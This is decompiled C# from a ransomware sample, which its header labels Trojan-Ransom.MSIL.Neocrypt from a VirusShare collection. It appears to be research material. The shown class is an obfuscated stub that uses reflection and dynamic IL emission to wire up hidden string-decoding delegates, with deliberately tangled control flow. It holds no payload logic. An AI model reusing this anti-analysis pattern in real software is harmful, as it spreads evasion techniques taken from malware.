// Decompiled with JetBrains decompiler
// Type: #fg.#Zb
// Assembly: LoadAssembly, Version=0.0.0.0, Culture=neutral, PublicKeyToken=489de906037d8a94
// MVID: B46B9881-0285-4729-849C-7A9813852236
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00060-msil\Trojan-Ransom.MSIL.Neocrypt.c-8e0fb6328a4a38782a33f209faefa22a0ca4b9aa.exe

using \u00230b;
using \u0023cg;
using System;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.InteropServices;

namespace \u0023fg
{
  [\u0003.\u0001]
  [\u0001.\u0001]
  internal static class \u0023Zb
  {
    [\u0003.\u0001]
    [\u0001.\u0001]
    [\u0002.\u0001]
    public static void \u0023gg([In] Type obj0)
    {
      FieldInfo[] fields = obj0.GetFields(BindingFlags.Static | BindingFlags.NonPublic | BindingFlags.GetField);
      int index1;
      do
      {
        index1 = 0;
      }
      while (false);
      while (true)
      {
        int num1 = index1;
        int num2 = fields.Length;
        if (true)
          num2 = num2;
        if (num1 < num2)
        {
          do
          {
            FieldInfo fieldInfo = fields[index1];
            try
            {
              if ((object) fieldInfo.FieldType == (object) typeof (\u0023bg))
              {
                DynamicMethod dynamicMethod;
                ILGenerator ilGenerator;
                MethodInfo[] methods;
                int index2;
                if (true)
                {
                  dynamicMethod = new DynamicMethod(string.Empty, typeof (string), new Type[1]
                  {
                    typeof (int)
                  }, obj0.Module, true);
                  do
                  {
                    ilGenerator = dynamicMethod.GetILGenerator();
                  }
                  while (false);
                  ilGenerator.Emit(OpCodes.Ldarg_0);
                  methods = typeof (\u0023Zb).GetMethods(BindingFlags.Static | BindingFlags.Public);
                  index2 = 0;
                  goto label_13;
                }
label_9:
                MethodInfo meth;
                if ((object) meth.ReturnType == (object) typeof (string))
                {
                  ilGenerator.Emit(OpCodes.Ldc_I4, fieldInfo.MetadataToken & 16777215);
                  ilGenerator.Emit(OpCodes.Sub);
                  if (true)
                  {
                    ilGenerator.Emit(OpCodes.Call, meth);
                    goto label_14;
                  }
                }
                else
                  ++index2;
label_13:
                if (index2 < methods.Length)
                {
                  meth = methods[index2];
                  goto label_9;
                }
label_14:
                ilGenerator.Emit(OpCodes.Ret);
                fieldInfo.SetValue((object) null, (object) dynamicMethod.CreateDelegate(typeof (\u0023bg)));
                return;
              }
            }
            catch
            {
            }
          }
          while (false);
          ++index1;
        }
        else
          break;
      }
    }
  }
}
